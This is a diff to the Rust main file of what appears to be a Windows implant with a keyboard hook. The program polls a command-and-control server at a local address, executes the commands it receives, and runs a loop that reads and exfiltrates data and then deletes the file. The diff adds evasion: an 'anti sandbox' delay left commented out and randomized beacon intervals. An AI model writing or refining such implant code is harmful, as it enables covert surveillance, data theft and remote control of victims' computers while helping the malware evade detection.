@@ -1,10 +1,11 @@
 mod server;
 mod system;
 mod encode;
-use std::{sync::Arc};
+use std::{sync::Arc, u32};
 use system::{get_windows_version, read_file, set_windows_hook, delete_file};
-use tokio::time::{Duration, sleep};
+use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
+use rand::{rngs::StdRng, SeedableRng, Rng};
 
 
 macro_rules! unwrap_or_panic {
@@ -20,7 +21,13 @@ macro_rules! unwrap_or_panic {
 }
 #[tokio::main]
 async fn main() {
+
+    //anti sandbox
+    // sleep(Duration::from_secs(600)).await;
+    
     const URL: &'static str = "http://127.0.0.1:5000";
+
+    // let mut rng = Arc::new(rand::rng());
 
     let paused = Arc::new(AtomicBool::new(false));
     let server = Arc::new(server::Connection::new(&URL));
@@ -55,20 +62,25 @@ async fn main() {
     });
 
     let paused_command = Arc::clone(&paused);
+    
     tokio::spawn(async move {
+        let mut rng = StdRng::from_os_rng();
         loop {
             if paused_command.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
                 continue;
             }
-
+            
             let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
             execute_command(&rec, paused_command.clone()).await;
-            sleep(Duration::from_secs(10)).await;
+            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
         }
     });
 
     let paused_exfil = Arc::clone(&paused);
+
+    let mut rng = StdRng::from_os_rng();
+
     tokio::spawn(async move {
         loop {
             if paused_exfil.load(Ordering::Relaxed) {
@@ -81,7 +93,7 @@ async fn main() {
                 delete_file();
             }
 
-            sleep(Duration::from_secs(10)).await;
+            sleep(Duration::from_secs(rng.gen_range(10..40))).await;
         }
     });
 
